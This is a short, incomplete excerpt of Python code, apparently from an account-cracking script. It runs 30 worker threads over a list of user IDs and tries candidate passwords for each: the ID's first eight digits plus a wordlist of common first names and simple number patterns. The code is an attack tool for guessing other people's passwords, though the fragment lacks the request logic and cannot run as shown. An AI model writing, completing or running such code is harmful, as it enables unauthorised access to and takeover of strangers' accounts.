    ...
    with tred(max_workers=30) as ___mal___:
       ...
       #  print('\033[1;37m[×]\033[1;36m USE APN FOR BETTER RESULT')
        ...
        for love in id:
           ...
           bu = ids[:8] #1st 8digit
           pwv = [love,au,bu,"sadiya","hridoy","708090","203040","taniya","mababa","jannat","bristy","alamin","sabbir","shakib","farjana","sultana","afsana",]
